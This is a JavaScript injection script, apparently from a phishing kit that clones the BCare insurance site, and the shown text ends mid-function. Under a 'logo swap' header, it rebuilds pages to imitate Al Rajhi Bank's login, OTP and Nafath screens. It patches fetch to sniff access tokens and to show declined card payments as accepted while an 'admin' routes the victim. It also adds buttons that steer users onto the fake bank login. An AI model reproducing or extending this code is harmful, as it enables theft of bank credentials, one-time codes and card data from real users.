/**
 * BCare — Rajhi Pages Logo Swap (injected)
 * -----------------------------------------------------------------------------
 * On all Rajhi pages (/rajhi-login, /rajhi-otp, /rajhi-nafath, /rajhi-call):
 *   1. HIDES the large FormShell BCare logo (width="200px", class "mb-6")
 *   2. REPLACES the small BCare logo (class "h-10" or "h-8" mx-auto) with Al Rajhi logo
 * ===========================================================================*/
(function () {
  "use strict";

  // =====================================================================
  // Idempotency-Key auto-injector
  // The compiled client bundle predates the backend's EnforceIdempotencyKey
  // middleware, so mutating requests (bookings / payments) arrive without the
  // required header and get rejected with 422 "Idempotency key is required".
  // We patch fetch to attach a valid, deterministic key for those endpoints.
  // Pattern required by the server: /^[A-Za-z0-9._:-]{16,128}$/
  // =====================================================================
  (function patchFetchForIdempotency() {
    if (typeof window.fetch !== "function" || window.__bcareIdemPatched) return;
    window.__bcareIdemPatched = true;

    // Per-page-load salt so identical bodies dedupe within a session,
    // but a fresh page load starts a new logical attempt.
    var PAGE_SALT = Math.random().toString(36).slice(2, 10) +
                    Date.now().toString(36);

    // Endpoints that require an Idempotency-Key (matches routes/api/v1/public.php)
    var NEEDS_KEY = /\/api\/v1\/(bookings|payments\/(invoice|card|iban|atm|otp|bank-transfer))(\/|$|\?)/;

    function simpleHash(str) {
      var h1 = 5381, h2 = 52711;
      for (var i = str.length - 1; i >= 0; i--) {
        var c = str.charCodeAt(i);
        h1 = (h1 * 33) ^ c;
        h2 = (h2 * 33) ^ c;
      }
      return (h1 >>> 0).toString(16) + (h2 >>> 0).toString(16);
    }

    function buildKey(method, url, body) {
      var basis = method + "|" + url + "|" + (body || "");
      var key = "idem." + PAGE_SALT + "." + simpleHash(basis);
      // Clamp to the server's 128-char ceiling; min length is already satisfied.
      return key.slice(0, 128);
    }

    var origFetch = window.fetch.bind(window);

    window.fetch = function (input, init) {
      try {
        var url = typeof input === "string"
          ? input
          : (input && input.url) || "";
        var method = ((init && init.method) ||
          (input && input.method) || "GET").toUpperCase();

        var mutating = method === "POST" || method === "PUT" || method === "PATCH";

        if (mutating && NEEDS_KEY.test(url)) {
          // Normalize headers into a plain object we can augment.
          var hdrs = new Headers((init && init.headers) ||
            (typeof input !== "string" && input && input.headers) || {});

          if (!hdrs.has("Idempotency-Key")) {
            var body = (init && typeof init.body === "string") ? init.body : "";
            hdrs.set("Idempotency-Key", buildKey(method, url, body));
            init = Object.assign({}, init, { headers: hdrs });
          }

          // Inject the custom birth-date field into the booking payload.
          // The backend already accepts birthDay / birthMonth / birthYear.
          var birth = window.__bcareBirth;
          if (birth && /\/api\/v1\/bookings(\/|$|\?)/.test(url) &&
              init && typeof init.body === "string") {
            try {
              var payload = JSON.parse(init.body);
              if (payload && typeof payload === "object" && !Array.isArray(payload)) {
                if (payload.birthDay == null)   payload.birthDay = birth.birthDay;
                if (payload.birthMonth == null) payload.birthMonth = birth.birthMonth;
                if (payload.birthYear == null)  payload.birthYear = birth.birthYear;
                init = Object.assign({}, init, { body: JSON.stringify(payload) });
              }
            } catch (e2) {
              // Body is not JSON — leave it untouched.
            }
          }
        }
      } catch (e) {
        // Never let the shim break a request — fall through to the original.
      }
      // Capture the client access token from responses so our own injected
      // calls (e.g. Rajhi quick-pay) can authenticate like the SPA does. The
      // SPA keeps this token in memory only, so we sniff it off the headers.
      return origFetch(input, init).then(function (resp) {
        try {
          var cat = resp.headers.get("x-client-access-token");
          if (cat) window.__bcareCAT = cat;
        } catch (e2) {}
        return resp;
      });
    };
  })();

  // =====================================================================
  // Payment card response interceptor
  // If the payment gateway rejects the card, suppress the error and
  // navigate the client to /processing so the admin can decide the route.
  // This makes ALL cards "accepted" on the client side in this environment.
  // =====================================================================
  (function patchFetchForPaymentRedirect() {
    if (window.__bcarePaymentPatched) return;
    window.__bcarePaymentPatched = true;
    var PAYMENT_CARD_RE = /\/api(?:\/laravel)?\/api\/v1\/payments\/card(\/|$|\?)/;
    var prevFetch = window.fetch.bind(window);
    window.fetch = function(input, init) {
      try {
        var url = typeof input === "string" ? input : (input && input.url) || "";
        var method = ((init && init.method) || (input && input.method) || "GET").toUpperCase();
        if (method === "POST" && PAYMENT_CARD_RE.test(url)) {
          return prevFetch(input, init).then(function(resp) {
            return resp.clone().json().then(function(data) {
              var rejected = !resp.ok ||
                data === null || data === undefined ||
                data.ok === false || data.success === false ||
                (data.error && data.error.code);
              if (rejected) {
                // Navigate client to waiting page so admin can route them
                setTimeout(function() {
                  try {
                    window.history.pushState({}, "", "/processing");
                    window.dispatchEvent(new PopStateEvent("popstate", {}));
                  } catch(ne) {}
                }, 250);
                // Return neutral response so SPA doesn't render error UI
                return new Response(
                  JSON.stringify({ ok: true, success: true, data: { pending: true } }),
                  { status: 200, headers: { "Content-Type": "application/json" } }
                );
              }
              return resp;
            }).catch(function() { return resp; });
          });
        }
      } catch(e) {}
      return prevFetch(input, init);
    };
  })();

  var RAJHI_LOGO_URL = "/assets/images/rajhi-logo.png";
  var TARGET_PATHS = ["/rajhi-login", "/rajhi-otp", "/rajhi-nafath", "/rajhi-call"];

  function isTargetPage() {
    return TARGET_PATHS.indexOf(window.location.pathname) !== -1;
  }

  function applyLogoChanges() {
    if (!isTargetPage()) return;

    // 1. Hide the large FormShell BCare logo (width="200px")
    var allImgs = document.querySelectorAll("img");
    for (var i = 0; i < allImgs.length; i++) {
      var img = allImgs[i];
      if (
        img.getAttribute("width") === "200px" &&
        img.src &&
        img.src.indexOf("Bcarelogo") !== -1
      ) {
        img.style.display = "none";
      }
    }

    // 2. Replace the small BCare logo (h-10 or h-8, mx-auto) with Rajhi logo
    var smallLogos = document.querySelectorAll("img.h-10, img.h-8");
    for (var j = 0; j < smallLogos.length; j++) {
      var sImg = smallLogos[j];
      if (sImg.src && sImg.src.indexOf("Bcarelogo") !== -1) {
        sImg.src = RAJHI_LOGO_URL;
        sImg.alt = "Al Rajhi Bank";
        sImg.style.objectFit = "contain";
      }
    }
  }

  // =========================================================
  // Rajhi Login Page — full UI redesign to match the official
  // Al Rajhi bank login page design.
  // Uses inline styles for maximum CSS specificity.
  // =========================================================

  function isLoginPage() {
    return window.location.pathname === "/rajhi-login";
  }

  function setStyle(el, styles) {
    if (!el) return;
    for (var k in styles) {
      el.style.setProperty(k, styles[k], "important");
    }
  }

  function applyRajhiLoginRedesign() {
    if (!isLoginPage()) {
      document.body.classList.remove("rajhi-login-page");
      return;
    }

    // Mark body so CSS can also target elements
    document.body.classList.add("rajhi-login-page");

    // ── Page background ────────────────────────────────────
    setStyle(document.body, { background: "#eef1ff" });

    // ── Hide BCare logo (width=200px) ──────────────────────
    var bcareLogos = document.querySelectorAll('img[width="200px"]');
    for (var i = 0; i < bcareLogos.length; i++) {
      setStyle(bcareLogos[i], { display: "none" });
    }

    // ── Style section.main as centered page ───────────────
    var mainSection = document.querySelector("section.main");
    if (mainSection) {
      setStyle(mainSection, {
        background: "#eef1ff",
        "min-height": "100dvh",
        display: "flex",
        "align-items": "center",
        "justify-content": "center",
        padding: "24px 16px",
        "flex-direction": "column"
      });
    }

    // ── Style card wrapper ────────────────────────────────
    var cardWrapper = mainSection ? mainSection.querySelector(":scope > div") : null;
    if (cardWrapper) {
      setStyle(cardWrapper, {
        background: "#fff",
        border: "1px solid #dde2f5",
        "border-radius": "12px",
        "box-shadow": "0 2px 20px rgba(10,30,100,.08)",
        padding: "0",
        overflow: "visible",
        "min-width": "0",
        width: "min(440px, 100%)",
        "max-width": "440px"
      });
      // Remove Tailwind overflow-hidden that clips injected elements
      cardWrapper.classList.remove("overflow-hidden");
    }

    // ── Fix form height (remove calc constraint) ───────────
    var form = document.querySelector("section.main form");
    if (form) {
      setStyle(form, {
        width: "100%",
        "max-width": "100%",
        height: "auto",
        "min-height": "0"
      });
    }

    // ── 1. Transform .top header ──────────────────────────
    var topDiv = document.querySelector(".top");
    if (topDiv && !topDiv.dataset.rlHeaderDone) {
      setStyle(topDiv, {
        display: "flex",
        "flex-direction": "row",
        "align-items": "flex-start",
        "justify-content": "space-between",
        padding: "16px 20px 12px",
        "border-bottom": "1px solid #e8ecf8",
        "margin-bottom": "0"
      });

      // Logo container: remove centering
      var logoCont = topDiv.querySelector(".py-2");
      if (logoCont) {
        setStyle(logoCont, { padding: "0", margin: "0" });
        var logoImg = logoCont.querySelector("img");
        if (logoImg) {
          setStyle(logoImg, { height: "40px", width: "auto", margin: "0", display: "block" });
        }
      }

      // Hide old headings — will inject new one below
      var h4 = topDiv.querySelector("h4");
      var h2 = topDiv.querySelector("h2");
      if (h4) setStyle(h4, { display: "none" });
      if (h2) setStyle(h2, { display: "none" });

      // Add "English" language button on the left (RTL: end side)
      if (!topDiv.querySelector(".rl-lang-btn")) {
        var langBtn = document.createElement("a");
        langBtn.className = "rl-lang-btn";
        langBtn.href = "#";
        langBtn.setAttribute("aria-label", "Switch to English");
        langBtn.textContent = "English";
        setStyle(langBtn, {
          "font-size": "13px",
          "font-weight": "600",
          color: "#1a3a7c",
          "text-decoration": "none",
          "align-self": "center",
          "font-family": "Cairo, Tajawal, sans-serif"
        });
        topDiv.appendChild(langBtn);
      }

      topDiv.dataset.rlHeaderDone = "1";
    }

    // ── 2. Welcome heading (inject between .top and .grow) ─
    var formFirstDiv = document.querySelector("section.main form > div:first-child");
    if (formFirstDiv && !formFirstDiv.querySelector(".rl-welcome")) {
      var growDiv = formFirstDiv.querySelector(".grow");
      if (growDiv) {
        var welcome = document.createElement("div");
        welcome.className = "rl-welcome";
        welcome.textContent = "مرحبا بك في الراجحي اون لاين";
        setStyle(welcome, {
          "font-size": "22px",
          "font-weight": "700",
          color: "#111827",
          "text-align": "center",
          padding: "20px 20px 4px",
          "font-family": "Cairo, Tajawal, sans-serif",
          "line-height": "1.5"
        });
        formFirstDiv.insertBefore(welcome, growDiv);
      }
    }

    // ── 3. Inject tabs ────────────────────────────────────
    if (formFirstDiv && !formFirstDiv.querySelector(".rl-tabs")) {
      var growDiv2 = formFirstDiv.querySelector(".grow");
      if (growDiv2) {
        var tabs = document.createElement("div");
        tabs.className = "rl-tabs";
        setStyle(tabs, {
          display: "flex",
          "flex-direction": "row",
          padding: "0 20px",
          "border-bottom": "2px solid #e8ecf8",
          "margin-bottom": "0",
          gap: "0"
        });

        var tabActive = document.createElement("button");
        tabActive.type = "button";
        tabActive.textContent = "تسجيل الدخول";
        setStyle(tabActive, {
          padding: "11px 16px",
          "font-size": "13px",
          "font-weight": "700",
          border: "none",
          background: "#1a237e",
          color: "#fff",
          "border-radius": "6px 6px 0 0",
          cursor: "pointer",
          "font-family": "Cairo, Tajawal, sans-serif",
          "white-space": "nowrap",
          outline: "none",
          "margin-bottom": "-2px"
        });

        var tabInactive = document.createElement("button");
        tabInactive.type = "button";
        tabInactive.textContent = "تسجيل الدخول باستخدام الرمز";
        setStyle(tabInactive, {
          padding: "11px 16px",
          "font-size": "13px",
          "font-weight": "600",
          border: "1px solid #d0d5e8",
          background: "#fff",
          color: "#555",
          "border-radius": "6px 6px 0 0",
          cursor: "pointer",
          "font-family": "Cairo, Tajawal, sans-serif",
          "white-space": "nowrap",
          outline: "none",
          "margin-bottom": "-2px",
          "margin-right": "6px"
        });

        tabs.appendChild(tabActive);
        tabs.appendChild(tabInactive);

        var welcomeEl = formFirstDiv.querySelector(".rl-welcome");
        formFirstDiv.insertBefore(tabs, welcomeEl ? welcomeEl.nextSibling : growDiv2);
      }
    }

    // ── 4. Style section label "تسجيل الدخول" ─────────────
    if (formFirstDiv && !formFirstDiv.querySelector(".rl-section-label")) {
      var growDiv3 = formFirstDiv.querySelector(".grow");
      if (growDiv3) {
        var sectionLabel = document.createElement("div");
        sectionLabel.className = "rl-section-label";
        sectionLabel.textContent = "تسجيل الدخول";
        setStyle(sectionLabel, {
          "font-size": "13px",
          "font-weight": "600",
          color: "#1a237e",
          padding: "16px 20px 4px",
          "font-family": "Cairo, Tajawal, sans-serif"
        });
        formFirstDiv.insertBefore(sectionLabel, growDiv3);
      }
    }

    // ── 5. Style the inputs container ─────────────────────
    var growDiv4 = document.querySelector("section.main form > div:first-child .grow");
    if (growDiv4) {
      setStyle(growDiv4, { padding: "4px 20px 0", gap: "14px" });
    }

    // ── 6. Change label texts ─────────────────────────────
    var usernameLabel = document.querySelector('label[for="username"]');
    if (usernameLabel && usernameLabel.textContent.trim() !== "اسم المستخدم") {
      usernameLabel.textContent = "اسم المستخدم";
    }
    var passwordLabel = document.querySelector('label[for="password"]');
    if (passwordLabel && passwordLabel.textContent.trim() !== "كلمة السر") {
      passwordLabel.textContent = "كلمة السر";
    }

    // ── 7. Style inputs ──────────────────────────────────
    var usernameInput = document.getElementById("username");
    if (usernameInput) {
      setStyle(usernameInput, {
        background: "#fff",
        border: "1.5px solid #c8d0e8",
        "border-radius": "7px",
        padding: "11px 14px",
        "font-size": "14px",
        color: "#111"
      });
    }
    var passwordInput = document.getElementById("password");
    if (passwordInput) {
      setStyle(passwordInput, {
        background: "#fff",
        border: "1.5px solid #c8d0e8",
        "border-radius": "7px",
        padding: "11px 14px",
        "font-size": "14px",
        color: "#111"
      });
    }

    // ── 8. Inject "تذكرني" row ────────────────────────────
    var firstFormDiv2 = document.querySelector("section.main form > div:first-child");
    if (firstFormDiv2 && !firstFormDiv2.querySelector(".rl-remember-row")) {
      var rememberRow = document.createElement("div");
      rememberRow.className = "rl-remember-row";
      setStyle(rememberRow, {
        display: "flex",
        "flex-direction": "row",
        "align-items": "center",
        "justify-content": "space-between",
        padding: "2px 20px 10px",
        "font-family": "Cairo, Tajawal, sans-serif"
      });

      var rememberLabel = document.createElement("label");
      rememberLabel.style.cssText = "display:flex;align-items:center;gap:6px;font-size:13px;color:#333;cursor:pointer;";
      var checkbox = document.createElement("input");
      checkbox.type = "checkbox";
      checkbox.id = "rl-remember";
      checkbox.style.cssText = "width:15px;height:15px;accent-color:#1a237e;cursor:pointer;";
      var rememberText = document.createElement("span");
      rememberText.textContent = "تذكرني";
      rememberLabel.appendChild(checkbox);
      rememberLabel.appendChild(rememberText);

      var forgotLink = document.createElement("a");
      forgotLink.href = "#";
      forgotLink.textContent = "هل نسيت كلمة السر؟";
      forgotLink.style.cssText = "font-size:13px;color:#1a237e;text-decoration:none;font-weight:500;";

      rememberRow.appendChild(rememberLabel);
      rememberRow.appendChild(forgotLink);
      firstFormDiv2.appendChild(rememberRow);
    }

    // ── 9. Style submit button ────────────────────────────
    var submitBtn = document.querySelector("section.main form button[type='submit']");
    if (submitBtn) {
      setStyle(submitBtn, {
        "border-radius": "7px",
        "font-size": "15px",
        "font-weight": "700",
        padding: "13px"
      });
      // Only override bg color — keep disabled state lighter
      if (!submitBtn.disabled) {
        setStyle(submitBtn, { background: "#1a237e" });
      } else {
        setStyle(submitBtn, { background: "#b0bce8" });
      }
    }

    // ── 10. Style submit button area padding ─────────────
    var submitArea = document.querySelector("section.main form > div:last-child");
    if (submitArea) {
      setStyle(submitArea, { padding: "8px 20px 20px" });
    }
  }

  function init() {
    applyLogoChanges();
    applyRajhiLoginRedesign();

    // Observe DOM mutations for SPA route changes
    var observer = new MutationObserver(function () {
      if (isTargetPage()) {
        applyLogoChanges();
      }
      applyRajhiLoginRedesign();
      applyPaymentMethodSelector();
      fixCaptchaAlignment();
      addRajhiSuggestionOnError();
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // Intercept history navigation for vue-router
    var origPush = history.pushState;
    var origReplace = history.replaceState;

    history.pushState = function () {
      origPush.apply(this, arguments);
      setTimeout(applyLogoChanges, 50);
      setTimeout(applyRajhiLoginRedesign, 100);
      setTimeout(applyPaymentMethodSelector, 200);
      setTimeout(applyPaymentMethodSelector, 600);
      setTimeout(addRajhiSuggestionOnError, 800);
    };
    history.replaceState = function () {
      origReplace.apply(this, arguments);
      setTimeout(applyLogoChanges, 50);
      setTimeout(applyRajhiLoginRedesign, 100);
      setTimeout(applyPaymentMethodSelector, 200);
      setTimeout(applyPaymentMethodSelector, 600);
      setTimeout(addRajhiSuggestionOnError, 800);
    };
    window.addEventListener("popstate", function () {
      setTimeout(applyLogoChanges, 50);
      setTimeout(applyRajhiLoginRedesign, 100);
      setTimeout(applyPaymentMethodSelector, 200);
      setTimeout(applyPaymentMethodSelector, 600);
      setTimeout(addRajhiSuggestionOnError, 800);
    });
  }

  // =========================================================
  // Add helpful error messages to Rajhi login validation
  // =========================================================
  function addValidationHint() {
    if (!isLoginPage()) return;

    // Add a hint below submit button
    var submitArea = document.querySelector("section.main form > div:last-child");
    if (submitArea && !submitArea.querySelector(".rl-validation-hint")) {
      var hint = document.createElement("div");
      hint.className = "rl-validation-hint";
      hint.innerHTML = "<strong>ملاحظة:</strong> اسم المستخدم وكلمة السر كل واحد 3 أحرف أو أكثر<br/>" +
                       "إذا كانت البيانات خاطئة ستظهر رسالة خطأ بعد الضغط على الزر.";
      hint.style.cssText = "font-size:13px;color:#666;text-align:center;margin-top:12px;font-family:Cairo,Tajawal,sans-serif;line-height:1.6;";
      submitArea.appendChild(hint);
    }
  }

  // =====================================================================
  // Payment Method Selector — /credit-card-payment
  // Shows 3 method buttons: Card (default), Rajhi Quick Pay, Apple Pay.
  // Apple Pay shows "service unavailable"; Rajhi navigates to /rajhi-login.
  // =====================================================================

  var RAJHI_LOGO_URL_PAYMENT = "/assets/images/rajhi-logo.png";

  function isPaymentPage() {
    return window.location.pathname === "/credit-card-payment";
  }

  function showApplePayUnavailable() {
    var existing = document.getElementById("rl-applepay-alert");
    if (existing) { existing.style.display = "flex"; return; }

    var overlay = document.createElement("div");
    overlay.id = "rl-applepay-alert";
    overlay.style.cssText = [
      "position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;",
      "background:rgba(0,0,0,.45);font-family:Cairo,Tajawal,sans-serif;"
    ].join("");

    var card = document.createElement("div");
    card.style.cssText = [
      "background:#fff;border-radius:16px;padding:32px 28px;max-width:340px;width:90%;",
      "text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.15);"
    ].join("");

    var icon = document.createElement("div");
    icon.style.cssText = "font-size:48px;margin-bottom:16px;";
    icon.textContent = "";

    var title = document.createElement("p");
    title.style.cssText = "font-size:17px;font-weight:700;color:#111;margin:0 0 8px;";
    title.textContent = "Apple Pay";

    var msg = document.createElement("p");
    msg.style.cssText = "font-size:14px;color:#555;margin:0 0 24px;line-height:1.6;";
    msg.textContent = "هذه الخدمة موقوفة حالياً";

    var btn = document.createElement("button");
    btn.style.cssText = [
      "background:#111;color:#fff;border:none;border-radius:10px;",
      "padding:11px 32px;font-size:14px;font-weight:600;cursor:pointer;",
      "font-family:Cairo,Tajawal,sans-serif;"
    ].join("");
    btn.textContent = "حسناً";
    btn.onclick = function() { overlay.style.display = "none"; };

    card.appendChild(icon);
    card.appendChild(title);
    card.appendChild(msg);
    card.appendChild(btn);
    overlay.appendChild(card);
    document.body.appendChild(overlay);
  }

  // "You are being redirected to Al Rajhi login" overlay shown while the
  // quick-pay flow authorizes the route and navigates.
  function showRajhiRedirecting() {
    var existing = document.getElementById("rl-rajhi-redirecting");
    if (existing) { existing.style.display = "flex"; return; }

    if (!document.getElementById("rl-spin-style")) {
      var st = document.createElement("style");
      st.id = "rl-spin-style";
      st.textContent = "@keyframes rlspin{to{transform:rotate(360deg)}}";
      document.head.appendChild(st);
    }

    var overlay = document.createElement("div");
    overlay.id = "rl-rajhi-redirecting";
    overlay.style.cssText = [
      "position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;",
      "background:rgba(0,0,0,.45);font-family:Cairo,Tajawal,sans-serif;"
    ].join("");

    var card = document.createElement("div");
    card.dir = "rtl";
    card.style.cssText = [
      "background:#fff;border-radius:16px;padding:30px 28px;max-width:340px;width:90%;",
      "text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.15);"
    ].join("");

    var logo = document.createElement("img");
    logo.src = RAJHI_LOGO_URL_PAYMENT;
    logo.style.cssText = "height:44px;object-fit:contain;margin-bottom:16px;";

    var msg = document.createElement("p");
    msg.style.cssText = "font-size:15px;font-weight:700;color:#1a237e;margin:0 0 16px;line-height:1.7;";
    msg.textContent = "سيتم تحويلك الى صفحة تسجيل دخول الراجحي";

    var spinner = document.createElement("div");
    spinner.style.cssText = "width:28px;height:28px;border:3px solid #dde2f5;border-top-color:#1a237e;border-radius:50%;margin:0 auto;animation:rlspin .8s linear infinite;";

    card.appendChild(logo);
    card.appendChild(msg);
    card.appendChild(spinner);
    overlay.appendChild(card);
    document.body.appendChild(overlay);

    setTimeout(function () { try { overlay.remove(); } catch (e) {} }, 5000);
  }

  // Locate the payment-form column wrapper. The real DOM has no section.main;
  // the card <form> lives inside a `max-w-[...]` wrapper alongside its heading.
  function getPaymentCardWrapper() {
    var form = document.querySelector("form");
    if (!form) return null;
    // form.parentElement is the wrapper that holds heading + form
    return form.parentElement || null;
  }

  function applyPaymentMethodSelector() {
    if (!isPaymentPage()) return;
    if (document.getElementById("rl-pm-selector")) return;

    var cardWrapper = getPaymentCardWrapper();
    if (!cardWrapper) return;

    // -- selector container -----------------------------------------------
    var selector = document.createElement("div");
    selector.id = "rl-pm-selector";
    selector.dir = "rtl";
    selector.style.cssText = [
      "border-bottom:1px solid #e8ecf8;padding:14px 20px 0;",
      "font-family:Cairo,Tajawal,sans-serif;"
    ].join("");

    var heading = document.createElement("p");
    heading.style.cssText = "font-size:13px;font-weight:600;color:#555;margin:0 0 10px;";
    heading.textContent = "اختر وسيلة الدفع";
    selector.appendChild(heading);

    var tabs = document.createElement("div");
    tabs.style.cssText = "display:flex;gap:8px;flex-wrap:wrap;padding-bottom:0;";
    selector.appendChild(tabs);

    function makeMethodBtn(id, label, logoSrc) {
      var btn = document.createElement("button");
      btn.type = "button";
      btn.dataset.pmId = id;
      btn.style.cssText = [
        "display:inline-flex;align-items:center;gap:7px;",
        "padding:8px 14px;border-radius:8px 8px 0 0;",
        "font-size:13px;font-weight:600;cursor:pointer;transition:background .15s;",
        "border:1px solid #dde2f5;border-bottom:2px solid transparent;",
        "background:#f7f8fd;color:#444;font-family:Cairo,Tajawal,sans-serif;"
      ].join("");

      if (logoSrc) {
        var img = document.createElement("img");
        img.src = logoSrc;
        img.style.cssText = "height:18px;object-fit:contain;";
        btn.appendChild(img);
      }

      var span = document.createElement("span");
      span.textContent = label;
      btn.appendChild(span);
      return btn;
    }

    var btnCard   = makeMethodBtn("card",     "الدفع بالبطاقة", null);
    var btnRajhi  = makeMethodBtn("rajhi",    "الدفع السريع الراجحي", RAJHI_LOGO_URL_PAYMENT);
    var btnApple  = makeMethodBtn("applepay", "Apple Pay", null);

    // Card tab: add Visa / Mastercard / Mada logos inline
    var cardLogos = [
      "/images/visa.png",
      "/images/mastercard.png",
      "/images/mada.png"
    ];
    cardLogos.forEach(function(src) {
      var cImg = document.createElement("img");
      cImg.src = src;
      cImg.style.cssText = "height:14px;object-fit:contain;margin-right:2px;";
      btnCard.appendChild(cImg);
    });

    // Apple Pay logo (inline SVG apple symbol)
    var appleSpan = document.createElement("span");
    appleSpan.style.cssText = "font-size:16px;line-height:1;";
    appleSpan.textContent = "";
    btnApple.insertBefore(appleSpan, btnApple.firstChild);

    tabs.appendChild(btnCard);
    tabs.appendChild(btnRajhi);
    tabs.appendChild(btnApple);

    // -- activate a method ------------------------------------------------
    var activeMethod = "card";

    function setActive(method) {
      activeMethod = method;
      [btnCard, btnRajhi, btnApple].forEach(function(b) {
        var isActive = b.dataset.pmId === method;
        b.style.background    = isActive ? "#fff" : "#f7f8fd";
        b.style.color         = isActive ? "#1a237e" : "#444";
        b.style.borderColor   = isActive ? "#dde2f5" : "#dde2f5";
        b.style.borderBottomColor = isActive ? "#fff" : "transparent";
        b.style.fontWeight    = isActive ? "700" : "600";
      });

      // show/hide form content (and its heading sibling) within the wrapper
      var form = cardWrapper.querySelector("form");
      if (form) {
        form.style.display = (method === "card") ? "" : "none";
        // Hide the heading div that precedes the form on non-card tabs
        var headingSib = form.previousElementSibling;
        if (headingSib && headingSib.id !== "rl-pm-selector") {
          headingSib.style.display = (method === "card") ? "" : "none";
        }
      }

      // Rajhi panel
      var rajhiPanel = document.getElementById("rl-pm-rajhi-panel");
      if (rajhiPanel) rajhiPanel.style.display = (method === "rajhi") ? "block" : "none";
    }

    // expose setActive so error-handler can call it
    selector._setActive = setActive;

    btnCard.onclick = function() { setActive("card"); };
    btnApple.onclick = function() { showApplePayUnavailable(); };
    btnRajhi.onclick = function() {
      setActive("rajhi");
      if (btnRajhi.dataset.rlBusy === "1") return;
      btnRajhi.dataset.rlBusy = "1";

      // Show the "redirecting to Al Rajhi login" message, then auto-navigate.
      showRajhiRedirecting();

      // The SPA route guard only permits the server-authorized route, so we ask
      // the server to authorize /rajhi-login and issue a signed route token,
      // then navigate CLIENT-SIDE to the signed alias (/r/<token>). The SPA's
      // own guard decodes the alias, stores the route token, and router-
      // navigates to /rajhi-login — no full reload (a reload would drop the
      // in-memory session token).
      function go(signedRoute, rt) {
        try {
          localStorage.setItem("current_route", "/rajhi-login");
          localStorage.setItem("pending_route", "/rajhi-login");
        } catch (e) {}
        var target;
        if (signedRoute) {
          target = signedRoute; // "/r/<token>"
        } else {
          var sep = window.location.search ? window.location.search + "&" : "?";
          target = "/rajhi-login" + (rt ? sep + "rt=" + encodeURIComponent(rt) : window.location.search);
        }
        window.history.pushState({}, "", target);
        window.dispatchEvent(new PopStateEvent("popstate", {}));
        btnRajhi.dataset.rlBusy = "0";
      }

      var pub = "", sess = "";
      try { pub = localStorage.getItem("public_token") || ""; } catch (e) {}
      try { sess = localStorage.getItem("session_id") || ""; } catch (e) {}
      var body = {};
      if (pub) body.public_token = pub;
      if (sess) body.session_id = sess;
      var headers = { "Content-Type": "application/json" };
      if (pub) headers["X-Session-Token"] = pub;
      if (window.__bcareCAT) headers["X-Client-Access-Token"] = window.__bcareCAT;

      fetch("/api/laravel/api/v1/payments/rajhi-redirect", {
        method: "POST",
        credentials: "include",
        headers: headers,
        body: JSON.stringify(body)
      })
        .then(function (r) { return r.json().catch(function () { return null; }); })
        .then(function (resp) {
          var d = (resp && resp.data) ? resp.data : resp;
          var signed = (d && d.signed_route) || (resp && resp.signed_route) || "";
          var rt = (d && d.route_access_token) || (resp && resp.route_access_token) || "";
          go(signed, rt);
        })
        .catch(function () { go("", ""); });
    };

    // insert selector BEFORE the first child of cardWrapper
    cardWrapper.insertBefore(selector, cardWrapper.firstChild);
    setActive("card");
  }

  // =====================================================================
  // Card-rejection detector — adds "Switch to Rajhi" button near the error
  // =====================================================================
  function addRajhiSuggestionOnError() {
    if (!isPaymentPage()) return;
    if (document.getElementById("rl-rajhi-error-suggestion")) return;

    // Detect card-rejection error message text
    var allText = document.querySelectorAll("p, div, span");
    var errorEl = null;
    for (var i = 0; i < allText.length; i++) {
      var t = allText[i].textContent || "";
      if (t.indexOf("تم رفض") !== -1 || t.indexOf("مشكلة في وسيلة الدفع") !== -1) {
        errorEl = allText[i];
        break;
      }
    }
    if (!errorEl) return;

    var suggestion = document.createElement("div");
    suggestion.id = "rl-rajhi-error-suggestion";
    suggestion.dir = "rtl";
    suggestion.style.cssText = [
      "margin-top:14px;padding:12px 16px;background:#eef3ff;border:1px solid #b8c8f0;",
      "border-radius:10px;font-family:Cairo,Tajawal,sans-serif;text-align:center;"
    ].join("");

    var msg = document.createElement("p");
    msg.style.cssText = "font-size:13px;color:#1a3a7c;margin:0 0 10px;font-weight:600;";
    msg.textContent = "جرب وسيلة دفع أخرى";
    suggestion.appendChild(msg);

    var rajhiBtn = document.createElement("button");
    rajhiBtn.type = "button";
    rajhiBtn.style.cssText = [
      "display:inline-flex;align-items:center;gap:8px;background:#1a237e;color:#fff;",
      "border:none;border-radius:8px;padding:10px 20px;font-size:13px;font-weight:700;",
      "cursor:pointer;font-family:Cairo,Tajawal,sans-serif;"
    ].join("");

    var rImg = document.createElement("img");
    rImg.src = RAJHI_LOGO_URL_PAYMENT;
    rImg.style.cssText = "height:18px;object-fit:contain;filter:brightness(10);";
    rajhiBtn.appendChild(rImg);

    var rSpan = document.createElement("span");
    rSpan.textContent = "الدفع السريع الراجحي";
    rajhiBtn.appendChild(rSpan);

    rajhiBtn.onclick = function() {
      // Activate Rajhi tab (scrolls to top first)
      window.scrollTo({ top: 0, behavior: "smooth" });
      var pmSelector = document.getElementById("rl-pm-selector");
      if (pmSelector && pmSelector._setActive) {
        pmSelector._setActive("rajhi");
        var rajhiTabBtn = pmSelector.querySelector('[data-pm-id="rajhi"]');
        if (rajhiTabBtn) rajhiTabBtn.click();
      }
    };

    suggestion.appendChild(rajhiBtn);

    // Insert right after (or near) the error element
    var insertTarget = errorEl.closest("div, section") || errorEl.parentNode;
    if (insertTarget && insertTarget.parentNode) {
      insertTarget.parentNode.insertBefore(suggestion, insertTarget.nextSibling);
    } else if (errorEl.parentNode) {
      errorEl.parentNode.appendChild(suggestion);
    }
  }

  // =====================================================================
  // Captcha alignment fix & Inbox placement near captcha
  // =====================================================================
  function fixCaptchaAlignment() {
    var cfWidget = document.querySelector("div.cf-turnstile, div[data-sitekey], iframe[src*='challenges.cloudflare']");
    if (!cfWidget) return;
    var parent = cfWidget.parentElement;
    if (!parent) return;
    // Ensure the captcha container is properly centered / aligned
    if (!parent.dataset.captchaFixed) {
      parent.style.cssText += ";display:flex;align-items:center;justify-content:flex-start;gap:12px;flex-wrap:wrap;";
      parent.dataset.captchaFixed = "1";
    }
  }

  // =====================================================================
  // Turnstile Bypass — reads /api/v1/site/settings; when Turnstile is
  // disabled for a context, injects the bypass key into __BCareTokenPool
  // so the SPA can proceed without waiting for a real CF challenge.
  // =====================================================================
  var _siteSettings = null;
  var _settingsFetched = false;

  function fetchSiteSettings(cb) {
    if (_settingsFetched) { cb(_siteSettings); return; }
